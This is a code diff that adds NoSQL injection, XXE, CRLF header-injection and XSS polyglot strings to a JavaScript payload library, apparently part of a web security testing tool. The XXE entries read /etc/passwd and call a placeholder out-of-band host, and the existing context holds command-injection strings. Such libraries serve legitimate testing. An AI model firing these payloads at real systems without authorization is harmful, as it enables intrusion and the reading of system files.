@@ -49,6 +49,28 @@ const LIBRARY = {
     '%0a id',
     '& ping -c 3 {{M}} &',
   ],
+  NoSQLi: [
+    '{"$gt":""}',
+    '{"$ne":null}',
+    '[$ne]=1',
+    '{"$where":"sleep(5000)"}',
+    "', $where: '1 == 1",
+    '{"$regex":".*"}',
+  ],
+  XXE: [
+    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
+    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://{{M}}/xxe">]><r>&x;</r>',
+    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&x;</r>',
+  ],
+  'CRLF / header': [
+    '%0d%0aSet-Cookie:%20injected=1',
+    '%0d%0aLocation:%20https://{{M}}',
+    '%E5%98%8A%E5%98%8DSet-Cookie:%20injected=1',
+  ],
+  Polyglot: [
+    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert({{M}})//>\\x3e',
+    "'\"><img src=x onerror=alert({{M}})>{{7*7}}${7*7}",
+  ],
 };
 
 // All category names.
